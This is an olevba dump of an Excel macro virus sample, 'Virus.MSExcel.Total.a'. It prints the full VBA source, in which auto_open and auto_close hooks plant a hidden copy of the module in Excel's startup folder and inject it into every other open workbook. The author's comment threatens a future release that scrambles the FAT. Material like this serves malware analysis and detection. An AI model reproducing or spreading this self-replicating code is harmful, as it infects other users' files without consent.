olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Total.a-de683bec6940e3c0322100a7ff005116dc51b5ea
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO sum_total.bas 
in file: Virus.MSExcel.Total.a-de683bec6940e3c0322100a7ff005116dc51b5ea - OLE stream: '_VBA_PROJECT_CUR/VBA/sum_total'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = ThisWorkbook.Name & "!sum_total.total"
End Sub
Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
'On Error Resume Next
PC_INITIAL_BOOK = Application.ThisWorkbook.Name
If Dir("C:\PASS.NHS") = "PASS.NHS" Then Exit Sub
pc_excel_startup_path = Application.StartupPath + "\INSTALL.XLS"
If Dir(pc_excel_startup_path) = "INSTALL.XLS" Then Exit Sub
'dstart:
'MsgBox "STARTING UP!"
ThisWorkbook.Modules("sum_total").Copy
new_book = ActiveWorkbook.Name
WindowState = xlMaximized
Application.Windows(new_book).Visible = False
'Application.Workbooks(new_book).SaveAs filename:=PC_EXCEL_STARTUP_PATH
Application.Workbooks(new_book).SaveAs filename:=pc_excel_startup_path
'MsgBox "All done saved as " & pc_excel_startup_path
'thisWorkbook.SaveAs filename:=PC_EXCEL_STARTUP_PATH
'ThisWorkbook.SaveAs filename:=PC_INITIAL_BOOK
End Sub
Sub total()
Attribute total.VB_ProcData.VB_Invoke_Func = " \n14"
PC_BOOK_COUNT = Application.Workbooks.Count
If PC_BOOK_COUNT = 1 Then Exit Sub
For pc_first_loop = 1 To PC_BOOK_COUNT
pc_copy_trigger = 0
PC_TARGET = Workbooks(pc_first_loop).Name
If PC_TARGET = ThisWorkbook.Name Then GoTo redundancy_check
pc_module_count = Workbooks(PC_TARGET).Modules.Count
If pc_module_count > 0 Then
For PC_SECOND_LOOP = 1 To pc_module_count
If Workbooks(PC_TARGET).Modules(PC_SECOND_LOOP).Name = "sum_total" Then pc_copy_trigger = 1
Next PC_SECOND_LOOP
End If
If pc_copy_trigger = 0 Then
Windows(PC_TARGET).Activate
ThisWorkbook.Modules("sum_total").Copy before:=Workbooks(PC_TARGET).Sheets(1)
Workbooks(PC_TARGET).Modules("sum_total").Visible = False
End If
redundancy_check:
Next pc_first_loop
skip:
Exit Sub
' ***********************************
' * IF YOU READ THIS THEN YOU WILL  *
' * REALISE THAT YOU HAVE THE MOST  *
' * RUBBISH ANTI-VIRUS SOFTWARE     *
' * BEWARE BECAUSE RELEASE II WILL  *
' * SCRAMBLE YOUR FAT - XOH         *
' ***********************************
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  sum_tota
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

